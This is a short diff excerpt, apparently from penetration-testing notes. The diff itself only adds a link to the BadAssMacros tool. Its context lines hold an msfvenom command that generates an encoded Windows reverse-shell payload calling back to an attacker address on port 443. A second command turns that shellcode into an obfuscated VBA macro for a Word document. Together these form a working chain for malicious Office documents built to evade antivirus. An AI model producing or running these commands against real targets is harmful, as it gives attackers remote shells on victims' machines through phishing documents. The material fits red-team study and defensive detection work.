@@ -4,7 +4,8 @@
 msfvenom -p windows/shell_reverse_tcp LHOST=192.168.x.x LPORT=443 -e x86/shikata_ga_nai -i 5 -f raw -o shellcode.txt
 ```
 
-> Use the x86 version of BadAssMacros:
+> Use the x86 version of BadAssMacros.
+> The tool can be found here: https://github.com/Inf0secRabbit/BadAssMacros
 
 ```
 .\BadAssMacros.exe -i shellcode.txt -w doc -p no -s indirect -c 5 -o shellcode.vba
